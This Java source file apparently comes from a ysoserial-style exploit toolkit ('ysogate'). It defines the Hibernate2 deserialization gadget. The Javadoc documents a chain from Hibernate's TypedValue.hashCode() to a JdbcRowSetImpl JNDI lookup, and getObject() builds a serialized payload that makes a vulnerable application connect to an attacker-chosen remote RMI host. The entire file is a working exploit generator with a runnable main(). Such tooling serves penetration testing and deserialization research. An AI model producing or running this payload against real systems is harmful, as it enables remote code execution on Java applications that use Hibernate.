package com.h2tg.ysogate.payloads.gadgets;


import com.h2tg.ysogate.payloads.DynamicDependencies;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.utils.JavaVersion;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.annotation.Authors;

import com.sun.rowset.JdbcRowSetImpl;


/**
 * Another application filter bypass
 * <p>
 * Needs a getter invocation that is provided by hibernate here
 * <p>
 * javax.naming.InitialContext.InitialContext.lookup()
 * com.sun.rowset.JdbcRowSetImpl.connect()
 * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * <p>
 * <p>
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 * <p>
 * Arg:
 * - JNDI name (i.e. rmi:<host>)
 * <p>
 * Yields:
 * - JNDI lookup invocation (e.g. connect to remote RMI)
 *
 * @author mbechler
 */
@SuppressWarnings({
		"restriction"
})
@Authors({Authors.MBECHLER})
public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies
{

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAtLeast(7);
	}

	public static String[] getDependencies() {
		return Hibernate1.getDependencies();
	}

	public Object getObject(String command) throws Exception {
		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName(command);
		return Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
	}

	public static void main ( final String[] args ) throws Exception {
		PayloadRunner.run(Hibernate2.class, args);
	}
}
